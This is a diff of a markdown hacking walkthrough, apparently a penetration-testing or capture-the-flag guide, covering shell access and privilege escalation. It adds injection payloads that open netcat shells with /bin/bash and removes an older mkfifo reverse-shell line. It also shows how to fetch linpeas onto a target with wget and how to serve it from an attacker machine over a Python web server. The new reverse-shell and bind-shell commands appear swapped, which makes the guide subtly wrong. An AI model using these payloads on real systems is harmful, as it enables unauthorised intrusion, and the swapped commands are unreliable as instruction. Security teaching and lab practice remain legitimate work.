@@ -512,7 +512,7 @@ nc -lnvp <PORT>
 This is the shell that we will be using.
  
 ```bash
-; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
+;nc -l <IP> <PORT> -e /bin/bash
 ```
 
 If we did everything right we should have a shell on the computer and we can
@@ -526,7 +526,7 @@ This is the shell that we will be using
 > Note: Unlike the reverse shell we don't need to open a listeners first
  
 ```bash
-; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l <IP> <PORT> > /tmp/f
+;nc <IP> <PORT> -e /bin/bash
 ```
 
 Don't forget that we need to make the connection, we can do that with the
@@ -657,6 +657,7 @@ Now that we have our payload we need to configure the settings.
 
 
 Now we can move on the [Privilege Escalation phase](#privilege-escalation)
+
 ## Privilege Escalation
 
 Now that we are the on the system as www-data or postgres, You notice that
@@ -692,16 +693,41 @@ Linpeas is very good at finding any privilege escalation method on a linux.
 > Note: Don't think you are safe on windows computer too soon, because there
 > is also Winpeas which is the linpeas of windows.
 
-The first thing to do to get linpeas on our computer or on the machine.
+The first thing to do to get linpeas on the computer you are attacking.
+You can download 
 
-If you are in kali then you can use this:
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/download/20240223-ab2bb023/linpeas.sh
 ```
+
+To run Linpeas you can just do the following:
+```bash
+./linpeas.sh
+```
+
 #### If you don't have internet on the when you are on the reverse shell.
 
-If the Machine you are attacking is not on the internet then you wil have to
-get linpeas on your main machine.
+If the Machine you are attacking doesn't have internet then you wil have to
+get linpeas on your attacker machine and then host a web server to transfer the
+file over. 
+
+```bash
+python3 -m http.server
+```
+> Note: You have to be in the current directory of Linpeas to see the file.
+
+Now on the machine that you want to use Linpeas, You have to now download the
+file from the web server you are hosting.
+
+```bash
+wget <OUR Attacker machine IP>/linpeas.sh
+```  
+
+Now you can run linpeas with the following:
+
+```bash
+./linpeas.sh
+```
 
 ### Manual Way
 
